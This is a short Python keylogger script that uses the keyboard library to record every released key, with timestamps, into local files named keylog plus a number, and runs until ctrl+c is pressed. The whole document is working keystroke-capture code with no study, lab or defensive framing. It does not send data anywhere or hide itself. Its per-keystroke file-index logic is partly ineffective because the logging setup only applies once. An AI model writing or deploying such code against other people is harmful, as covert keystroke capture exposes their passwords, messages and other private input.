import keyboard
import logging
import os

def main():
    
    keyboard.on_release(callback=record_keystroke)

    try:
        keyboard.wait('ctrl+c')
    except KeyboardInterrupt:
        print("Exiting...")

def record_keystroke(event):

    index = get_next_log_index()


    filename = f'keylog{index}.txt'
    logging.basicConfig(filename=filename, level=logging.DEBUG, format='%(asctime)s - %(message)s')


    logging.info(event.name)

def get_next_log_index():
    index = 1
    while os.path.exists(f'keylog{index}.txt'):
        index += 1
    return index

if __name__ == "__main__":
    main()

